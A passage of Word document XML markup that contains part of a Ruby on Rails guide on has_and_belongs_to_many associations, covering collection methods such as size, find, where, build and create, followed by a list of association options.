              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>any assemblies</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08B7902D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;% end</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="211F3114" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.1.10 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44AA83B6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.size</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method returns the number of objects in the collection.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4824"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="79580B41" w14:textId="77777777" w:rsidTr="00C24ACF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5C8BC6D7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82">
            <w:pPr>
              <w:divId w:val="1643657019"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@assembly_count</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= @part.assemblies.size</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="41B4C50F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.1.11 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.find(…)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EF8A172" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.find</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method finds objects within the collection. It uses the same syntax and options as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::Base.find</w:t>
      </w:r>
      <w:r>
        <w:t>. It also adds the additional condition that the object must be in the collection.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4464"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="178C13E1" w14:textId="77777777" w:rsidTr="00C24ACF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="335679D1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82">
            <w:pPr>
              <w:divId w:val="1328559256"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@assembly</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= @part.assemblies.find(1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="73E3671E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.1.12 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.where(…)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75F7D591" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.where</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method finds objects within the collection based on the conditions supplied but the objects are loaded lazily meaning that the database is queried only when the object(s) are accessed. It also adds the additional condition that the object must be in the collection.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="215C1732" w14:textId="77777777" w:rsidTr="00C24ACF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3FC91CA1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82">
            <w:pPr>
              <w:divId w:val="583881923"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@new_assemblies</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= @part.assemblies.where("created_at &gt; ?", 2.days.ago)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="64F2904F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.1.13 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.exists?(…)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48971AEA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.exists?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method checks whether an object meeting the supplied conditions exists in the collection. It uses the same syntax and options as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::Base.exists?</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67F05248" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.1.14 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.build(attributes = {})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="099174BE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.build</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method returns a new object of the associated type. This object will be instantiated from the passed attributes, and the link through the join table will be created, but the associated object will </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> yet be saved.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5784"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="69F4CBD4" w14:textId="77777777" w:rsidTr="00C24ACF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2C3855AC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@assembly</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= @part.assemblies.build(</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="083B6741" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  {:assembly_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "Transmission housing"})</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6F3C6C17" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.1.15 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.create(attributes = {})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C0B93A8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.create</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method returns a new object of the associated type. This object will be instantiated from the passed attributes, the link through the join table will be created, and, once it passes all of the validations specified on the associated model, the associated object </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>will</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> be saved.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5784"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="56A2C378" w14:textId="77777777" w:rsidTr="00C24ACF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="632C840C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@assembly</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= @part.assemblies.create(</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3DD2AF7A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  {:assembly_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "Transmission housing"})</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3D31BEDE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.2 Options for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3874102F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">While Rails uses intelligent defaults that will work well in most situations, there may be times when you want to customize the behavior of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association reference. Such customizations can easily be accomplished by passing options when you create the association. For example, this assocation uses two such options:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6744"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="5162B515" w14:textId="77777777" w:rsidTr="00C24ACF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="579DA421" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Parts &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55AE63A6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_and_belongs_to_many :assemblies, :uniq</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E31B318" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    :read_only</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73B066BF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="52C9BEAB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association supports these options:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20A4905F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:association_foreign_key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="644355B7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:autosave</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="063C3915" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:class_name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F6687CF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:conditions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B74FE58" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:counter_sql</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="424E5042" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:delete_sql</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5169C918" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:extend</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="625484BE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:finder_sql</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F7563DC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:foreign_key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3584CBE9" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:group</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="428F6D15" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:include</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13588464" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:insert_sql</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45DBA7ED" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:join_table</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16C60066" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
